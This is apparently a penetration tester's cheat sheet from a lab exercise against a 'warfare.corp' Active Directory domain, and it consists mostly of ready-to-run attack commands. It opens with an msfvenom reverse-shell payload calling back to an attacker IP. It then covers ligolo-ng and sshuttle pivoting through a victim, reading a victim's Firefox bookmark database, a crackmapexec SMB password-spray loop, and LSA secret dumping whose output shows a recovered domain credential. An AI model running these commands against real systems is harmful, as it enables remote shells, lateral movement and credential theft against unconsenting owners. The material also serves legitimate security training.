# mfsvenom

	msfvenom --platform windows -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=9999 -f exe -o rev.exe

# Pivoting

Sshuttle Command:

	sshuttle -r user@remote_host:2222 192.168.98.0/24 
	sshuttle -r user@remote_host 192.168.98.0/24 

	192.168.98.0/24 -> get from check ifconfig when see 2 adapter
	
	after shuttle
	
	nmap -sC -sV 192.168.98.5 -> IP for Pivoting

ligolo-ng

	#Attacker Machine, download proxy & agent :
	
	#Proxy
	wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
	tar -xvzf ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz

	#Agent
	wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
	tar -xvzf ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz

	Setup the ligolo-ng proxy in the attacker machine & ligolo-ng in the victim machine.

	# Attacker Machine
	sudo ip tuntap add user kali mode tun ligolo

	#Delete the 192.168.98.0/24 IP Range from the tun0 interface :
	sudo ip route del 192.168.98.0/24 dev tun0
	#Up the ligolo interface :
	sudo ip link set ligolo up
	#Add 192.168.98.0/24 IP range to the ligolo interface :
	sudo ip route add 192.168.98.0/24 dev ligolo

	Confirm the route on your attacker machine.

	ip route

	Start the proxy on the attacker server
	./proxy -selfcert -laddr 0.0.0.0:443

	Transfer the agent on the victim machine & start the connection
	#Replace this with your attacker IP address.
	./agent -connect 10.10.200.124:443 -ignore-cert

	session
	list_tunnels
	start

SSH Pivoting

	ssh -D 8088 privilege@192.168.80.10
	netstat -ano | grep 8088




# Firefox Find Information

	ls -la .mozilla/
	cd .mozilla/firefox/
	# The filename may vary on your infrastructure, identify & use accordingly
	cd b2rri1qd.default-release
	
	sqlite3 places.sqlite
	.tables
	select * from moz_bookmarks;

# SMB

SMB Bruteforce IP List with one username and password

	for i in 2 15 30 120; do crackmapexec smb "192.168.98.$i" -u "john" -p "User1@#$%6" ; done

SMB check information 

	crackmapexec smb 192.168.98.2

	for i in 2 15 30 120; do crackmapexec smb "192.168.98.$i" sleep 10; done

SMB LSA 

	crackmapexec smb 192.168.98.30 -u john -p User1@#$%6 --lsa

	Output: 
		SMB         192.168.98.30   445    MGMT             			corpmngr@child.warfare.corp:User4&*&*

	



# Error NTP with kerberous Attack AD

	sudo apt update
	sudo apt install ntpdate
	timedatectl 
	timedatectl set-ntp true
	reboot
	sudo systemctl start ntp
	sudo systemctl status ntp


# AD PowerView

	
	Get-AdForest 
	
	
	ApplicationPartitions : {DC=DomainDnsZones,DC=warfare,DC=corp, DC=DomainDnsZones,DC=child,DC=warfare,DC=corp, 
	                        DC=ForestDnsZones,DC=warfare,DC=corp}
	CrossForestReferences : {}
	DomainNamingMaster    : dc01.warfare.corp
	Domains               : {child.warfare.corp, warfare.corp}
	ForestMode            : Windows2016Forest
	GlobalCatalogs        : {dc01.warfare.corp, cdc.child.warfare.corp}
	Name                  : warfare.corp
	PartitionsContainer   : CN=Partitions,CN=Configuration,DC=warfare,DC=corp
	RootDomain            : warfare.corp
	SchemaMaster          : dc01.warfare.corp
	Sites                 : {Default-First-Site-Name}
	SPNSuffixes           : {}
	UPNSuffixes           : {}

